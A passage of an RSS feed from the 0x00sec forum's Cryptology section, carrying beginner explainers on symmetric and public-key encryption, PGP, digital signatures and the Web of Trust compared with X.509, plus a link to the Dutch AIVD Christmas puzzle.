          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1414</guid>
          <source url="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414.rss">Reverse shell in Python with RSA encryption</source>
        </item>
        <item>
          <title>Cryptography for Absolute Beginners</title>
          <dc:creator><![CDATA[VoidAccess]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p><strong>Cryptography</strong> is an ancient mathematical science that was originally used for military communications, and designed to conceal the contents of a message should it fall into the hands of the enemy. Recent developments in cryptography have added additional uses, including mechanisms for authenticating users on a network, ensuring the integrity of transmitted information and preventing users from repudiating (i.e. rejecting ownership of) their transmitted messages.</p>
<p>Today, encryption is an integral part of many of the tools and protocols we rely on to protect the security of our everyday transactions and online communications. Encryption can be used on the physical layer of the Internet to scramble data that’s being transmitted via cable or radio communications. It adds support for secure communications to plaintext protocols like the Hypertext Transfer Protocol (HTTP), which enables Web browsing, and can protect the integrity of data exchanged through applications like email and mobile messengers. You can also encrypt data that is stored on devices like cellphones or computers, shielding the local copies of emails, text messages, documents, and photos from unauthorized snooping.</p>
<p>How and at what layer your data is encrypted makes a huge difference. Just because a product or service uses encryption doesn’t necessarily mean that everything that’s stored on or sent over that platform is completely private. For example, Google now makes the HTTPS protocol (HTTP over an encrypted connection) the default for all Gmail traffic, which prevents unauthorized users from reading emails while they travel between Google’s email servers and end users’ computers—but it does nothing to stop Google itself from accessing plaintext copies of those conversations. If you don’t want your email provider to be able to read your messages, you have to take additional steps to implement end-to-end encryption, which refers to a system in which “messages are encrypted in a way that allows only the unique recipient of a message to decrypt it, and not anyone in between.” With end-to-end encryption, you encrypt the contents of a message on your local machine or device. That data is then transmitted as ciphertext by the email provider to the intended recipient, who is the only person who can decrypt and read it.</p>
<p><strong>Is all of law enforcement and US government against encryption?</strong></p>
<p>Not necessarily. Law enforcement and intelligence officials have often said they appreciate the benefits of encryption when it comes to protecting data from threats such as hackers or foreign governments. <a href="http://www.csmonitor.com/World/Passcode/2015/0915/FBI-DOJ-want-tech-industry-to-find-workaround-to-warrant-proof-encryption" rel="noopener nofollow ugc">They just want to be sure there’s a way</a> to access encrypted data – especially communications – for <em>their</em> investigations.</p>
<p><strong>First, how does encryption protect my data?</strong></p>
<p>Encryption algorithms use math to “scramble” data so it can’t be read by an unauthorized person – such as a hacker or government seeking to break in.</p>
<p>Data can be encrypted in two places: First, it can be encrypted “in transit,” such as when you send information from your browser to a website. Second, data can be encrypted when it’s “at rest,” such as when it is stored on a computer or on a server.</p>
<p>Data that can be read and understood without any special measures is called plaintext or cleartext. The method of disguising plaintext in such a way as to hide its substance is called encryption. Encrypting plaintext results in unreadable gibberish called ciphertext. You use encryption to ensure that information is hidden from anyone for whom it is not intended, even those who can see the encrypted data. The process of reverting ciphertext to its original plaintext is called decryption.</p>
<p>Ciphertext<br>
If this article was encrypted, anyone who intercepts the encrypted version of it would instead see a very long string of unintelligible numbers and letters, such as: “SNaqi82xleab92lkafdtuijgjf0dgfdojtkr8vcp2dso”<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/a/a595ce7ad4c7a8477fdc1be9da54a2dc79a8ca7a.gif" width="425" height="112"></p>
<p><strong>Symmetric-key encryption</strong></p>
<p>To unscramble the encrypted data, you will need an encryption “key.”(kinda like a Password) The key is a very large number that an encryption algorithm uses to change the data back into a readable form. Without the key, no one but the owner of the encrypted data will be able to access a readable version. This unscrambling process is called "decryption."This is what’s known as symmetric-key encryption.</p>
<p>Symmetric-key encryption has benefits. It is very fast. It is especially useful for encrypting data that is not going anywhere. However, conventional encryption alone as a means for transmitting secure data can be quite expensive simply due to the difficulty of secure key distribution.</p>
<p>Recall a character from your favorite spy movie: the person with a locked briefcase handcuffed to his or her wrist. What is in the briefcase, anyway? It’s probably not the missile launch code/ biotoxin formula/ invasion plan itself. It’s the key that will decrypt the secret data.</p>
<p>For a sender and recipient to communicate securely using Symmetric-key encryption, they must agree upon a key and keep it secret between themselves. If they are in different physical locations, they must trust a courier, the Bat Phone, or some other secure communication medium to prevent the disclosure of the secret key during transmission. Anyone who overhears or intercepts the key in transit can later read, modify, and forge all information encrypted or authenticated with that key. From DES to Captain Midnight’s Secret Decoder Ring, the persistent problem with Symmetric-key encryption is key distribution: how do you get the key to the recipient without someone intercepting it?</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/da48ef38eb51e9dba5b085a9b23ace6a5e355476.gif" width="449" height="201"></p>
<p><strong>Public key cryptography (Also known as Asymmetric encryption)</strong></p>
<p>The problems of key distribution are solved by public key cryptography. Public key cryptography is an asymmetric scheme that uses a pair of keys for encryption: a public key, which encrypts data, and a corresponding private, or secret key for decryption. You publish your public key to the world while keeping your private key secret. Anyone with a copy of your public key can then encrypt information that only you can read. Even people you have never met.</p>
<p>It is computationally infeasible to deduce the private key from the public key. Anyone who has a public key can encrypt information but cannot decrypt it. Only the person who has the corresponding private key can decrypt the information.</p>
<p>The primary benefit of public key cryptography is that it allows people who have no preexisting security arrangement to exchange messages securely. The need for sender and receiver to share secret keys via some secure channel is eliminated; all communications involve only public keys, and no private key is ever transmitted or shared. Some examples of public-key cryptosystems are Elgamal (named for its inventor, Taher Elgamal), RSA (named for its inventors, Ron Rivest, Adi Shamir, and Leonard Adleman), Diffie-Hellman (named, you guessed it, for its inventors), and DSA, the Digital Signature Algorithm (invented by David Kravitz).</p>
<p>Because conventional cryptography was once the only available means for relaying secret information, the expense of secure channels and key distribution relegated its use only to those who could afford it, such as governments and large banks (or small children with secret decoder rings). Public key encryption is the technological revolution that provides strong cryptography to the adult masses. Remember the courier with the locked briefcase handcuffed to his wrist? Public-key encryption puts him out of business (probably to his relief).</p>
<p>PGP combines some of the best features of both conventional and public key cryptography. PGP is a hybrid cryptosystem. When a user encrypts plaintext with PGP, PGP first compresses the plaintext. Data compression saves modem transmission time and disk space and, more importantly, strengthens cryptographic security. Most cryptanalysis techniques exploit patterns found in the plaintext to crack the cipher. Compression reduces these patterns in the plaintext, thereby greatly enhancing resistance to cryptanalysis. (Files that are too short to compress or which don’t compress well aren’t compressed.)</p>
<p>PGP then creates a session key, which is a one-time-only secret key. This key is a random number generated from the random movements of your mouse and the keystrokes you type. This session key works with a very secure, fast conventional encryption algorithm to encrypt the plaintext; the result is ciphertext. Once the data is encrypted, the session key is then encrypted to the recipient’s public key. This public key-encrypted session key is transmitted along with the ciphertext to the recipient.</p>
<p><a href="https://www.youtube.com/watch?v=GSIDS_lvRv4" rel="noopener nofollow ugc">How it works</a></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2addfad7aab103df0117671b5044e553fbe57aeb.gif" width="427" height="200"></p>
<p>Decryption works in the reverse. The recipient’s copy of PGP uses his or her private key to recover the temporary session key, which PGP then uses to decrypt the conventionally-encrypted ciphertext.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/942906262b084e706d4bb64f935b983378ccee5d.gif" width="427" height="177"></p>
<p>The combination of the two encryption methods combines the convenience of public key encryption with the speed of symmetric encryption. symmetric encryption is about 1,000 times faster than public key encryption. Public key encryption in turn provides a solution to key distribution and data transmission issues. Used together, performance and key distribution are improved without any sacrifice in security.</p>
<p><strong>Keys</strong><br>
A key is a value that works with a cryptographic algorithm to produce a specific ciphertext. Keys are basically really, really, really big numbers. Key size is measured in bits; the number representing a 1024-bit key is darn huge. In public key cryptography, the bigger the key, the more secure the ciphertext.</p>
<p>While the public and private keys are mathematically related, it’s very difficult to derive the private key given only the public key; however, deriving the private key is always possible given enough time and computing power. This makes it very important to pick keys of the right size; large enough to be secure, but small enough to be applied fairly quickly. Additionally, you need to consider who might be trying to read your files, how determined they are, how much time they have, and what their resources might be.</p>
<p>Larger keys will be cryptographically secure for a longer period of time. If what you want to encrypt needs to be hidden for many years, you might want to use a very large key. Of course, who knows how long it will take to determine your key using tomorrow’s faster, more efficient computers? There was a time when a 56-bit symmetric key was considered extremely safe.</p>
<p><strong>Digital signatures</strong></p>
<p>A major benefit of public key cryptography is that it provides a method for employing digital signatures. Digital signatures enable the recipient of information to verify the authenticity of the information’s origin, and also verify that the information is intact. Thus, public key digital signatures provide authentication and data integrity. A digital signature also provides non-repudiation, which means that it prevents the sender from claiming that he or she did not actually send the information. These features are every bit as fundamental to cryptography as privacy, if not more.</p>
<p>A digital signature serves the same purpose as a handwritten signature. However, a handwritten signature is easy to counterfeit. A digital signature is superior to a handwritten signature in that it is nearly impossible to counterfeit, plus it attests to the contents of the information as well as to the identity of the signer.</p>
<p>Some people tend to use signatures more than they use encryption. For example, you may not care if anyone knows that you just deposited $1000 in your account, but you do want to be darn sure it was the bank teller you were dealing with.</p>
<p>Instead of encrypting information using someone else’s public key, you encrypt it with your private key. If the information can be decrypted with your public key, then it must have originated with you.</p>
<p>That’s it for Part 1</p>
<hr>
<p>Be sure to check out these  tutorials:<br>
<a href="https://0x00sec.org/t/gpg-pgp-command-line-basic-tutorial/1341" class="onebox" target="_blank" rel="noopener">https://0x00sec.org/t/gpg-pgp-command-line-basic-tutorial/1341</a><br>
<a href="https://0x00sec.org/t/how-to-clearsign-and-verify-a-message-using-pgp-gpg/1370" class="onebox" target="_blank" rel="noopener">https://0x00sec.org/t/how-to-clearsign-and-verify-a-message-using-pgp-gpg/1370</a><br>
<a href="https://0x00sec.org/t/how-to-sign-and-verify-a-document-or-file-using-pgp-gpg/1337" class="onebox" target="_blank" rel="noopener">https://0x00sec.org/t/how-to-sign-and-verify-a-document-or-file-using-pgp-gpg/1337</a></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/cryptography-for-absolute-beginners/1412">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/cryptography-for-absolute-beginners/1412</link>
          <pubDate>Sat, 31 Dec 2016 09:36:35 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1412</guid>
          <source url="https://0x00sec.org/t/cryptography-for-absolute-beginners/1412.rss">Cryptography for Absolute Beginners</source>
        </item>
        <item>
          <title>PGP: The Web Of Trust</title>
          <dc:creator><![CDATA[Nitrax]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hi fellas,</p>
<p>Following the practical cases of <a class="mention" href="https://0x00sec.org/u/voidaccess">@VoidAccess</a>, I wanted to introduce you the reputation trust model and a piece of history behind PGP.</p>
<p>As you probably already know, PGP, which stands for “Pretty Good Privacy”, has been developed by Phil Zimmermann in 1991. The general purpose of this technology was to protect data by applying a strong and unbreakable encryption. It is only later that it has been widely applied to email exchange area. Following the release of PGP, Phil was an indictment by the United States Customs Services for violation of the Arms Export Control Act. Indeed, by this time, encryption was considered as a war weapon, at the same level that nuke. The government dropped the case in 1997, resulting in a new release of PGP (Welcome Backdoors !!! <img src="https://0x00sec.org/images/emoji/twitter/imp.png?v=9" title=":imp:" class="emoji" alt=":imp:">)</p>
<p>PGP, considered as the first, widely distributed cryptographic scheme implementing the public key algorithm, is, by default, highly vulnerable to masquerade when come the time to share its public key. Indeed, once your key pair generated, the public key has to be sent to the receiver, allowing to decrypt the protected information. During the distribution process, this key could be intercepted and changed in order to impersonate the original sender, allowing the attacker to spoof the exchange between the two protagonists in an undetectable manner.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/5363f82479897001df49ce140a891a65926abc05.jpeg" width="690" height="290"></p>
<p>Two solutions have been implemented to avoid this issue.</p>
<p>The cryptographic solution is the signature. Indeed, even if Bob sends a message encrypted with Alice public key, Alice will not be certain that the message comes from Bob. The signature consists to encrypt the encrypted message with his own private key, which must be kept secret, in order to ensure the origin of the message. For further security, a timestamp is added to the signature to prevent any data tampering during the transfert.</p>
<p>The second way relies on the community around PGP, with the implementation of the Web Of Trust.</p>
<p>However, before describing this concept, I would like to explain you the X.509 certificate format in order to give you a better overview of the different trust model used over the internet.</p>
<h2>X.509</h2>
<p>X.509 certificates are widely used over the internet to secure your communications with web services and encrypt your emails through S/MIME. Each certificate is signed by a CA (certificate authority), which is signed by another CA or a root CA, ensuring that the signed certificate is trustworthy.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/47b8e76397e3621ac3c389fae2fa4bbe290911d3.gif" width="473" height="242"></p>
<p>As you can see on the picture above, this trust system is hierarchical and rely on the integrity of the CA chain. In case of certificate corruption, the CA must revoke the certificate and update the CRL (certificate revocation list) then dispatch the update to the other CAs.  However, can we really trust them? Do they really ensure security? Basically, we have no choice … In the past, a few examples showed the limitation of this trust model.</p>
<blockquote>
<p>On March 23, 2011, Comodo reported that 8 days earlier, on 15 March 2011, a user account with an affiliate registration authority had been compromised and was used to create a new user account that issued nine certificate signing requests. Nine certificates for seven domains were issued. The attack was traced to IP address 212.95.136.18, which originates in Tehran, Iran. Though the firm initially reported that the breach was the result of a “state-driven attack”, it subsequently stated that the origin of the attack may be the “result of an attacker attempting to lay a false trail.”. Such issues have been widely reported, and has led to criticism of how certificates are issued and revoked. As of 2015, all of the certificates have been revoked. Microsoft has issued a security advisory and update to address the issue.<br>
On March 26, 2011, a person under the username “ComodoHacker” made several posts to <a href="http://Pastebin.com" rel="noopener nofollow ugc">Pastebin.com</a> claiming to be an Iranian responsible for the attacks.</p>
</blockquote>
<p>#<span class="hashtag">#Web</span> of trust</p>
<p>Here we go, now that you know how other certificates works and the principal problematic of public key algorithm, you will be able to appreciate the formidable concept of Web Of Trust <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>The Web Of Trust is a community based trust model that entirely rely on its users. Each PGP user has a pair of keyring (public and private). Let’s takes a look on the public keyring.</p>
<p>The public keyring references each user that signed the owner public key. Each signature contains a timestamp, an expiration date, the user ID, the public key, the user trust level and a few other flags.<br>
The concept is simple, higher is the trust level of the signature owner, higher will be the trust level of the public key owner. There are two different levels of trust: partial and full, which are declined in several degrees. Consequently, a user fully trusted will more impactful on the public key trust level than three or four partial trusted users.</p>
<p>The Web Of Trust implement the basic aspects of trust e.g transitivity and reciprocality. Here is a nice schematic representation of this model.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/fb75041c9607f30b2e7718283f8ccef4bc805e96.gif" width="500" height="368"></p>
<p>To continue with, the public key sharing can be done through multiple vectors:</p>
<ul>
<li>Physically</li>
<li>via keyservers</li>
<li>via emails or friends, etc.</li>
</ul>
<p>This model has the particularity to not only rely on a single entity but on a set of people, trustworthy or not, that confirmed the origin and belonging of the key. It results in a better trust assessment of the key owner than the classical X.509 format.</p>
<p>However, PGP has some downsides too. Indeed, in case of revocation, the user have to revoke his key then update the revocation on the keyservers in order to prevent any further usage of his key. Moreover, he has to warn his friends or colleagues that his key has been revoked.</p>
<p>We can also wonder about the efficiency of this model. Indeed, does the trust is really transitive? Can you really trust someone that you don’t know personaly? I think that the concept of trust should lead to an other intensive debate. Anyway, this domain is complexe as hell and difficult to define. Nevertheless, it’s nice to see that this scheme works pretty nice <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Despite those cons and thanks to its unique trust model, PGP is a good trade off for anyone that want to protect his personal data and his emails.</p>
<p>I hope you enjoyed this article.</p>
<p>Best,<br>
Nitrax</p>
<p>P.S: Don’t forget to take a look on the great <a class="mention" href="https://0x00sec.org/u/voidaccess">@VoidAccess</a> articles :</p>
<ul>
<li><a href="https://0x00sec.org/t/how-to-sign-and-verify-a-document-or-file-using-pgp-gpg/1337">How to signe and verify a document or file using PGP/GPG</a></li>
<li><a href="https://0x00sec.org/t/gpg-pgp-command-line-basic-tutorial/1341">GPG (PGP) Command Line - Basic Tutorial</a></li>
<li><a href="https://0x00sec.org/t/how-to-clearsign-and-verify-a-message-using-pgp-gpg/1370">How to Clearsign and Verify a Message using PGP/GPG</a></li>
</ul>
<h2>Would you like an article about X.509 trust system and its downsides?</h2>
<p><a href="https://0x00sec.org/t/pgp-the-web-of-trust/1404/1">Click to view the poll.</a></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/pgp-the-web-of-trust/1404">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/pgp-the-web-of-trust/1404</link>
          <pubDate>Thu, 29 Dec 2016 12:21:15 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1404</guid>
          <source url="https://0x00sec.org/t/pgp-the-web-of-trust/1404.rss">PGP: The Web Of Trust</source>
        </item>
        <item>
          <title>For the Dutchies (might be doable for English people with google translator)</title>
          <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>So the Dutch intelligence agency has posted a Christmas Puzzel.<br>
It’s related to cryptography and steganography mainly.<br>
The puzzel is in dutch, but I think a lot of them can be made by English people as well.<br>
You can find the puzzel here:<br>
</p><aside class="onebox pdf">
  <header class="source">
      <a href="https://www.aivd.nl/binaries/aivd_nl/documenten/publicaties/2016/12/12/kerstpuzzel-2016/Kerstpuzzel+2016.pdf" target="_blank" rel="nofollow noopener">aivd.nl</a>
  </header>
  <article class="onebox-body">
    <a href="https://www.aivd.nl/binaries/aivd_nl/documenten/publicaties/2016/12/12/kerstpuzzel-2016/Kerstpuzzel+2016.pdf" target="_blank" rel="nofollow noopener"><span class="pdf-onebox-logo"></span></a>
<h3><a href="https://www.aivd.nl/binaries/aivd_nl/documenten/publicaties/2016/12/12/kerstpuzzel-2016/Kerstpuzzel+2016.pdf" target="_blank" rel="nofollow noopener">Kerstpuzzel+2016.pdf</a></h3>

<p class="filesize">1638.05 KB</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>So I did the first 2 and I think googling the Dutch version of some words having to do with the theme ‘Christmas’ might help the English people trying this.</p>
<p>I’d say it being a foreign language makes it a bigger challenge.<br>
There is no guide besides what’s in the file.</p>
            <p><small>5 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/for-the-dutchies-might-be-doable-for-english-people-with-google-translator/1374">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/for-the-dutchies-might-be-doable-for-english-people-with-google-translator/1374</link>
          <pubDate>Thu, 22 Dec 2016 14:06:40 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1374</guid>
          <source url="https://0x00sec.org/t/for-the-dutchies-might-be-doable-for-english-people-with-google-translator/1374.rss">For the Dutchies (might be doable for English people with google translator)</source>
        </item>
  </channel>
</rss>
